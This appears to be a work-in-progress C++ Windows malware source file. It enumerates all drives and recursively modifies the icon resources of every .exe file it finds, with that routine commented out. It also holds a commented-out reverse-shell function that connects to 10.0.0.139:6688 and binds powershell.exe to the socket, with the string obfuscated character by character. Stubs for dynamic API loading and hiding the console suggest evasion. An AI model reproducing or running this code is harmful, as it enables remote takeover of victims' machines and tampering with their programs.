//#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "resource.h"
//#include <WinSock2.h>
//#include <stdio.h>
//#pragma comment(lib,"ws2_32")
//#include <ws2tcpip.h>
#include "Friends.h"

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <Sfc.h>

#pragma comment(lib, "sfc")

//typedef HRSRC(WINAPI* d_FindResourceExW)(
//        
//);
//
//typedef UINT(WINAPI* d_GetDriveType)(
//    __in_opt LPCWSTR lpRootPathName
//);
//
//
//typedef HMODULE(WINAPI* d_LoadLibraryExW)(
//    __in        LPCWSTR     lpLibFileName,
//    HANDLE      hFile,
//    __in        DWORD       dwFlags
//);

//void CreateRevShell()
//{
//    WSADATA wsaData;
//    SOCKET Winsock;
//    struct sockaddr_in hax;
//    char ip_addr[11] = "10.0.0.139"; //RHOST
//    char port[5] = "6688"; //RPORT
//
//    STARTUPINFO ini_processo;
//
//    PROCESS_INFORMATION processo_info;
//
//    WSAStartup(MAKEWORD(2, 2), &wsaData);
//    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
//
//    struct hostent* host;
//    host = gethostbyname(ip_addr);
//    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr*)host->h_addr)));
//
//    //inet_ntop()
//
//    hax.sin_family = AF_INET;
//    hax.sin_port = htons(atoi(port));
//    hax.sin_addr.s_addr = inet_addr(ip_addr);
//
//    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
//
//    memset(&ini_processo, 0, sizeof(ini_processo));
//    ini_processo.cb = sizeof(ini_processo);
//    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
//    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
//
//    TCHAR cmd[15] = { 'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e', 0 };
//
//    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
//
//}

std::vector<std::wstring> GetDriveLetters()
{
    
    wchar_t driveSlash[] = {':','\\',0};
    std::vector<std::wstring> foundDrives;
    wchar_t diskLetter = 67; // Start with 'C'
    //std::wstring da = driveSlash;
    
    for (short i = 1; i != 25; i++)
    {
        std::wstring concatDrivePath;
        concatDrivePath += diskLetter;
        concatDrivePath += driveSlash;
        UINT drivetype = ::GetDriveTypeW(concatDrivePath.c_str());

        if (drivetype != 5 && drivetype != 0)
        {
            if (std::filesystem::exists(concatDrivePath))
            {
                foundDrives.push_back(concatDrivePath);
            }
        }
        diskLetter++;
    }
    return foundDrives;
}

std::map<LPCWSTR, WORD> resNames;

BOOL CALLBACK EnumIconLang(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam)
{
    if (lpType == NULL && lpName == NULL)
    {
        return false;
    }

    resNames.emplace(lpName, wLanguage);
    return true;
}
BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam)
{
    if (lpType == NULL && lpName == NULL)
    {
        return false;
    }

    if (!::EnumResourceLanguagesExW(hModule, lpType, lpName, EnumIconLang, lParam, 0, 0))
    {

    }

    return true;
}

void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
{
    wchar_t exeExt[] = { '.','e','x','e',0 };
    for (auto itr_path : std::filesystem::recursive_directory_iterator(*pathStart, std::filesystem::directory_options::skip_permission_denied))
    {
 
        if (itr_path.path().extension() == exeExt)
        {
            const std::wstring currentPath = itr_path.path().wstring();
            const std::wstring currentPathFilename = itr_path.path().filename().wstring();

            if (::SfcIsFileProtected(NULL, currentPath.c_str()))
            {
                continue;
            }

            HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
            if (hmTheExe == NULL)
            {
                resNames.clear();
                continue;
            }

            if (!::EnumResourceNamesExW(hmTheExe, MAKEINTRESOURCEW(RT_ICON), EnumIconNames, NULL, 0, 0))
            {
                switch (::GetLastError())
                {
                    case 1812:
                    case 1813:
                    {
                        
                        /*std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add" << "\n";
                        if (!::FreeLibrary(hmTheExe))
                        {
                            resNames.clear();
                            continue;
                        }
                        HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
                        if (hUpdateResource == NULL)
                        {
                            resNames.clear();
                            continue;
                        }
                        if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon, dwMDcanIconSize))
                        {
                            std::wcout << ::GetLastError() << " Could not update group resource." << "\n";
                            resNames.clear();
                            continue;
                        }
                        if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon, dwMDcanIconSize))
                        {
                            std::wcout << ::GetLastError() << " Could not update icon resource." << "\n";
                            resNames.clear();
                            continue;
                        }
                        if (!::EndUpdateResourceW(hUpdateResource, false))
                        {
                            std::wcout << ::GetLastError() << " Could not end update resource." << "\n";
                            resNames.clear();
                            continue;
                        }*/
                        //resNames.clear();
                        break;
                    }
                    default:
                        break;
                }
                resNames.clear();
                continue;
            }

            if (!::FreeLibrary(hmTheExe))
            {
                resNames.clear();
                continue;
            }

            /*HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
            if (hUpdateResource == NULL)
            {
                resNames.clear();
                continue;
            }

            std::map<LPCWSTR, WORD>::iterator itr;
            for (itr = resNames.begin(); itr != resNames.end(); itr++)
            {
                if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon, dwMDcanIconSize))
                {
                    resNames.clear();
                    continue;
                }
            }

            if (!::EndUpdateResourceW(hUpdateResource, false))
            {
                resNames.clear();
                continue;
            }*/

            resNames.clear();
        }
    }
}

void ReplaceSysIcons()
{
    // Get paths to 
    // C:\Windows\SystemResources\imageres.dll.mun
    // C:\Windows\SystemResources\shell32.dll.mun
    // ...
}

int main()
{
    
    //::SetPrivi
    //::EnableDebugPr
    //d_GetModuleHandle(L"Something");

    //d_LoadLibraryExW c_LoadLibraryExW = (d_LoadLibraryExW)GetProcAddress();

    //::FreeConsole();

    HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
    if (hresMDCanIcon == NULL)
    {
        return -1;
    }

    HGLOBAL hgMDcanIcon = ::LoadResource(NULL, hresMDCanIcon);
    if (hgMDcanIcon == NULL)
    {
        return -1;
    }

    LPVOID lpMDcanIcon = ::LockResource(hgMDcanIcon);
    if (lpMDcanIcon == NULL)
    {
        return -1;
    }

    DWORD dwMDcanIconSize = SizeofResource(NULL, hresMDCanIcon);
    if (dwMDcanIconSize == 0)
    {
        return -1;
    }
    
    //std::vector<std::wstring> drives = GetDriveLetters();

    //std::thread rplSystemIcons(ReplaceSysIcons);

    /*for (auto &drive : drives)
    {
        std::filesystem::path drivepath = drive.c_str();
        ReplaceEXEIconResources(&drivepath, lpMDcanIcon, dwMDcanIconSize);
    }*/

    ::SleepEx(90000, 0);

    //CreateRevShell();

    UnlockResource(lpMDcanIcon);
    ::FreeResource(hgMDcanIcon);
    std::wcout << std::endl;

    return 0;
}